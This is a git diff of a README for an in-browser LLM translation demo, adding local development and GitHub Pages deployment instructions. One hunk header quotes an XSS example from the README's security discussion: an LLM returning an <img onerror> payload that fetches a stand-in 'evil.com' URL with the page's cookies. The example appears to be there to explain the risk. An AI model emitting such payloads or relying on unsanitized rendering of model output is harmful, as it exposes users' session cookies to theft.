@@ -49,8 +49,7 @@ Open browser console (F12) to see:
 ```
 LocalTranslator/
 ├── index.html              # Main demo page
-├── package.json            # Dependencies
-├── server.py              # Development server
+├── server.py              # Development server (local only)
 ├── README.md              # This file
 ├── demo/
 │   ├── demo.js           # Demo logic
@@ -144,7 +143,25 @@ User translates text → LLM returns: <img src="x" onerror="fetch('evil.com?cook
 
 ## Development
 
-### Adding Custom Models
+### Local Development
+
+```bash
+python3 server.py
+```
+
+This starts a local HTTP server at http://localhost:8000. Changes to source files are reflected immediately on page refresh.
+
+**Note:** `server.py` is for local development only.
+
+### Deployment
+
+The project is deployed to **GitHub Pages** at https://ai.wikman.es
+
+Deployment is automatic - push to `main` branch and GitHub Pages deploys from `/` (root).
+
+1. Changes pushed to `main` are deployed automatically
+2. No build step required - pure ES modules
+3. Access at: https://ai.wikman.es
 
 1. Enter model ID in "Custom Model" field
 2. Click "Apply Custom"
